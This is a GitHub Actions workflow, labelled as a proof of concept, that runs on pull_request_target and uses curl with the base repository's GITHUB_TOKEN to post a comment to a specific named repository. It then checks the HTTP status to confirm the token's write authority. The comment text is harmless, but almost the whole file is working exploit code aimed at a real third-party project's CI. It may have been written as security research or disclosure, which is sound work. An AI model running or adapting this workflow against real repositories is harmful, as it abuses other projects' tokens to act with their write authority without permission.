name: PoC - Comment Using Base Repository Token

on:
  pull_request_target:
    types: [opened, synchronize, reopened]

permissions:
  contents: read
  issues: write
  pull-requests: write

jobs:
  prove-write-authority:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout PR code from fork
        uses: actions/checkout@v3

      - name: Post Authenticated Comment as Base Repo Owner
        run: |
          echo "=== Proof of Concept: Write Authority ==="

          PR_NUMBER=${{ github.event.pull_request.number }}

          COMMENT_BODY="POC tested"

          echo "[*] Attempting to post comment to PR: $PR_NUMBER"

          STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
            -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            https://api.github.com/repos/SvavaCapital/svava-terraform-github-actions/issues/$PR_NUMBER/comments \
            -d "{\"body\":\"$COMMENT_BODY\"}")

          echo "HTTP status from comment API: $STATUS"

          if [ "$STATUS" = "201" ] || [ "$STATUS" = "200" ]; then
            echo "[+] PoC SUCCESS: Base repository token used to comment ‚ùå"
          else
            echo "[-] PoC FAILED with status: $STATUS"
          fi

          echo ""
          echo "Execution repository according to runtime:"
          echo "$GITHUB_REPOSITORY"

          echo "=== End of PoC ==="
